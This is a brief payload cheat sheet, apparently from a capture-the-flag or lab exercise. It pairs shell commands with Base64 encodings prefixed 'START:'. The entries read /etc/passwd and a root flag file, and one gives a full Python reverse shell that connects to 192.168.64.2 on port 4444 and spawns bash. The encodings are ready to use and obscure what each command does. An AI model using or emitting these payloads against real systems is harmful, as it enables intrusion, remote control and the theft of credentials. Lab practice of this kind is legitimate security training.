# Some Sample Commands Encoded in Base64

### START:echo 'hello world
U1RBUlQ6ZWNobyAnaGVsbG8gd29ybGQn

### START:cat /etc/passwd
U1RBUlQ6Y2F0IC9ldGMvcGFzc3dk

### START:cat /root/FLAG-root.txt
U1RBUlQ6Y2F0IC9yb290L0ZMQUctcm9vdC50eHQ=

### START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
U1RBUlQ6cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC42NC4yIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn